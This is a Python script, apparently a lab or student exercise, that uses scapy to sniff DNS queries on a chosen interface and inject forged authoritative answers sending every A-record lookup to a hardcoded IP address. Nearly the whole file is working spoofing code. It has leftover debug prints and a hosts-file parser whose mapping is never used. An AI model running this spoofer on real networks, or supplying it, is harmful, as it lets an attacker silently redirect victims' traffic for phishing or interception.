import sys
import getopt
import os
import scapy.all as scapy


hostfile_dict = {}
def handle(packet):
	print("So far")
	if packet.haslayer(scapy.DNS):
		print("So far")
		orig_ip = packet.getlayer(scapy.IP)
		orig_udp = packet.getlayer(scapy.UDP)
		orig_dns = packet.getlayer(scapy.DNS)
		print("source ip:")
		print(orig_ip.src)
		print("dst ip")
		print(orig_ip.dst)
		print(orig_dns.qd.qname)
		

		if orig_dns.qr == 0 and orig_dns.qd.qtype == 1: #qr = 0 for Query and qtype = 1 for A record
			spoofed_src_ip = orig_ip.dst
			spoofed_dst_ip = orig_ip.src
			spoofed_src_port = orig_udp.dport
			spoofed_dst_port = orig_udp.sport
			spoofed_id = orig_dns.id
			spoofed_qr = 1
			spoofed_opcode = orig_dns.opcode
			spoofed_aa = 1
			spoofed_rd = orig_dns.rd
			spoofed_ra = 0
			spoofed_z = 0
			spoofed_rcode = 0
			spoofed_qdcount = 1
			spoofed_ancount = 1
			spoofed_question = scapy.DNSQR(qname = orig_dns.qd.qname, qtype = orig_dns.qd.qtype, qclass = orig_dns.qd.qclass)
			spoofed_answer = scapy.DNSRR(rrname = orig_dns.qd.qname, type = orig_dns.qd.qtype, rclass = orig_dns.qd.qclass, ttl = 40960, rdata = "172.160.54.65")

			spoofed_IP = scapy.IP(src = spoofed_src_ip, dst = spoofed_dst_ip)
			spoofed_UDP = scapy.UDP(sport = spoofed_src_port, dport = spoofed_dst_port)
			spoofed_DNS = scapy.DNS(id = spoofed_id, qr = 1, opcode = spoofed_opcode, aa = 1, rd = spoofed_rd, ra = 0, z = 0, rcode = 0, qdcount = spoofed_qdcount, ancount = spoofed_ancount, qd = spoofed_question, an = spoofed_answer)

			scapy.sendp(scapy.Ether()/spoofed_IP/spoofed_UDP/spoofed_DNS, iface = dev 	)
			
def hostfile_parser(hostfile):
	host = dict()
	with open(hostfile, 'r') as file:
		for line in file:
			ip, sep, domain = line.partition(" ")
			host[ip] = domain
	return host
	
if __name__ == "__main__":
	cmdLineOptions = "i:h:"
	options, bpf  = getopt.getopt(sys.argv[1:], cmdLineOptions)
	for op in options:
		if "-i" in op[0]:
			dev = op[1]
		elif "-h" in op[0]:
			hostfile = op[1]
			hostfile_dict = hostfile_parser(hostfile)
	filter = "dst port 53 " 
	if bpf:
		filter += str(bpf)
	print(str(hostfile_dict))
	print ("Spoofing DNS requests on %s" % (dev))
	scapy.sniff(iface=dev, filter=filter, prn=handle)



